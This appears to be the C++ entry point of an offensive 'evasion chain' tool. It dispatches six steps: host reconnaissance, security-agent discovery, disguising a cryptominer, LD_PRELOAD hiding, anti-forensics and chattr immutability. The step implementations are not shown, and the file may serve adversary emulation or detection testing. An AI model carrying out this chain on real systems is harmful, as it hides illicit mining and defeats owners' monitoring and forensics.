#include "config.hpp"
#include "evasion_steps.hpp"
#include "log.hpp"

#include <curl/curl.h>
#include <iostream>

namespace {

void print_usage() {
  std::cout << "Usage: evasion_native [step]\n"
            << "  step: 1-6 or 'all' (default)\n";
}

}  // namespace

int main(int argc, char* argv[]) {
  curl_global_init(CURL_GLOBAL_DEFAULT);

  const auto cfg = evasion::Config::from_env();
  evasion::EvasionChain chain(cfg);

  std::string mode = "all";
  if (argc > 1) mode = argv[1];

  try {
    if (mode == "all") {
      chain.run_all();
    } else if (mode == "1") {
      chain.step01_host_recon();
    } else if (mode == "2") {
      chain.step02_discover_agents();
    } else if (mode == "3") {
      chain.step03_masquerade_miner();
    } else if (mode == "4") {
      chain.step04_ld_preload_hide();
    } else if (mode == "5") {
      chain.step05_anti_forensics();
    } else if (mode == "6") {
      chain.step06_chattr_immutable();
    } else {
      print_usage();
      curl_global_cleanup();
      return 1;
    }
  } catch (const std::exception& ex) {
    evasion::die(std::string("exception: ") + ex.what());
  }

  curl_global_cleanup();
  return 0;
}
